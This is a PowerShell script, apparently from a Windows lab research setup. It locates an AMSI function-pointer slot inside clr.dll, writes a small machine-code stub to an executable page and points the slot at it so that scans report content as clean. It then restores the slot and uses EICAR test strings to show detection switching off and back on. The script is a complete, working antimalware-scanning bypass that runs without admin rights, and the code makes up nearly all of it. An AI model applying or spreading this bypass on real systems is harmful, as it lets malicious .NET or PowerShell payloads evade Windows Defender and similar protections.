#requires -Version 5
# 01-clr-slot-per-arm.ps1
# Capture target: a fresh live.png / live.mp4 showing CLR slot=0x... on each arm.
# Delivery: run on the win11 lab guest from a standard-user powershell.exe
# (no admin, no elevation). Writes the transcript to Desktop\clr-slot-capture.txt
# which the host pulls back via winpull.sh.
#
# Expected per-arm shape (post-publication the caption pins exactly this format):
#   A_baseline     slot=0x7ffe... (inside amsi.dll)   result=32768
#   B_patched      slot=0x1ff...  (stub page)          result=1
#   C_restored     slot=0x7ffe... (inside amsi.dll)   result=32768
#   EICAR control start/end: result=32768 both ends (oracle alive)
# Signature oracle: EICAR must detect at start and end; a null arm invalidates
# the whole capture.

$ErrorActionPreference = 'Stop'
$log = Join-Path $env:USERPROFILE 'Desktop\clr-slot-capture.txt'
Start-Transcript -Path $log -Force | Out-Null

Add-Type -Name V -Namespace W -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string s);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandleW(string s);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr n, uint p, out uint o);
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
[DllImport("amsi")]    public static extern int AmsiInitialize(string an, out IntPtr ctx);
'@
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace W {
  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
  public delegate int AsbDel(IntPtr ctx, byte[] b, uint n, string cn, IntPtr s, out int r);
}
'@ -Language CSharp

$clr  = [W.V]::GetModuleHandleW('clr.dll'); if ($clr -eq [IntPtr]::Zero) { $clr = [W.V]::LoadLibraryA('clr.dll') }
$slot = [IntPtr]::new($clr.ToInt64() + 0x929870)
$orig = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($slot)
"slot addr = 0x{0:x}" -f $slot.ToInt64()
"orig fn   = 0x{0:x}  (expect inside amsi.dll)" -f $orig.ToInt64()

$eicar = [System.Text.Encoding]::ASCII.GetBytes('X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

function Invoke-ViaSlot([string]$arm) {
    $fp = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($slot)
    $d  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fp, [W.AsbDel])
    $ctx = [IntPtr]::Zero
    [void][W.V]::AmsiInitialize('DotNet_slot_test', [ref]$ctx)
    $r = 0
    [void]$d.Invoke($ctx, $eicar, [uint32]$eicar.Length, "clr-slot-$arm", [IntPtr]::Zero, [ref]$r)
    "{0,-12} slot=0x{1:x}  result={2}" -f $arm, $fp.ToInt64(), $r
}

# EICAR control start
Invoke-ViaSlot 'ctrl_start'

# A: baseline
Invoke-ViaSlot 'A_baseline'

# Build 15-byte stub on an RWX page, flip slot to it
$stubBytes = [byte[]](0xb8,0x01,0x00,0x00,0x00, 0x48,0x8b,0x4c,0x24,0x30, 0x89,0x01, 0x33,0xc0, 0xc3)
$page = [W.V]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
[System.Runtime.InteropServices.Marshal]::Copy($stubBytes, 0, $page, $stubBytes.Length)
$oldp = 0
[void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), 0x04, [ref]$oldp)   # PAGE_READWRITE
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $page)
[void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), $oldp, [ref]$oldp)

# B: patched
Invoke-ViaSlot 'B_patched'

# Restore and C
[void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), 0x04, [ref]$oldp)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $orig)
[void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), $oldp, [ref]$oldp)

Invoke-ViaSlot 'C_restored'

# EICAR control end
Invoke-ViaSlot 'ctrl_end'

"sig  : $((Get-MpComputerStatus).AMEngineVersion) / $((Get-MpComputerStatus).AntivirusSignatureVersion)"
"build: $((Get-CimInstance Win32_OperatingSystem).Version)"

Stop-Transcript | Out-Null
"log -> $log"
